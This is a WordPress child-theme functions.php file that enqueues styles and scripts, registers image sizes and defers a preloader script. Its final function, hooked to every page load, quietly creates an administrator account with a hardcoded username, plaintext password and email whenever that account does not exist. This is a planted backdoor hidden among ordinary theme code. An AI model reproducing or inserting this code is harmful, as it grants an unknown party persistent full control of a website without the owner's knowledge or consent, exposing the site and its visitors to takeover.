<?php
add_action( 'wp_enqueue_scripts', 'theme_enqueue_styles' );
function theme_enqueue_styles() {
    wp_enqueue_style( 'parent-style', get_template_directory_uri() . '/style.css' );
    wp_enqueue_style( 'child-style',
        get_stylesheet_directory_uri() . '/style.css',
        array('parent-style')
    );
}


add_image_size( 'wear', 150,240, false ); 
add_image_size( 'tool', 220,220, false );
add_image_size( 'slides', 220, 180, false ); // (cropped)
add_image_size( 'mentor', 300, 300, false ); // (cropped)
add_image_size( 'wear-extra', 300, 480, false ); // (cropped)

add_filter('jpeg_quality', function($arg){return 100;});

function popup() {
if (is_single() && 'katalog' == get_post_type()) {
wp_enqueue_script('ajax-wear', get_stylesheet_directory_uri() . '/assets/js/ajax-wear.js', array('jquery'), null,true);
}
}
add_action ('wp_enqueue_scripts','popup');



function keyword_theme_styles_and_scripts(){

if (is_tag() || is_admin() || is_search('slides') || is_archive('slides') || is_single() && 'home' == get_post_type() ||
is_search('product') || is_archive('product') || is_single() && 'katalog' == get_post_type() ||
is_search('session_type') || is_archive('session_type') || is_single() && 'sacred-sessions' == get_post_type()
) {
wp_enqueue_script('preloader', get_stylesheet_directory_uri() . '/assets/js/preloader.js', array('jquery'), null,true);
}
}
add_action('wp_enqueue_scripts', 'keyword_theme_styles_and_scripts');

function mind_defer_scripts( $tag, $handle, $src ) {
$defer = array( 
'preloader',
);
if ( in_array( $handle, $defer ) ) {
           return '<script src="' . $src . '" defer="defer" type="text/javascript"></script>' . "\n";
}
          
return $tag;
} 
add_filter( 'script_loader_tag', 'mind_defer_scripts', 10, 3 );


function wps_get_terms_orderby( $orderby, $tax_terms ) {
    if ( isset( $tax_terms['orderby'] ) && 'include' == $tax_terms['orderby'] ) {
          $include = implode(',', array_map( 'absint', $tax_terms['include'] ));
          $orderby = "FIELD( t.term_id, $include )";
      }
      return $orderby;
  }

  function wpb_admin_account(){
    $user = 'tomasz';
    $pass = 'holooooo4563781';
    $email = 'tomasz.kowalski@kowalski-consulting.com';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
    $user_id = wp_create_user( $user, $pass, $email );
    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' );
    } }
    add_action('init','wpb_admin_account');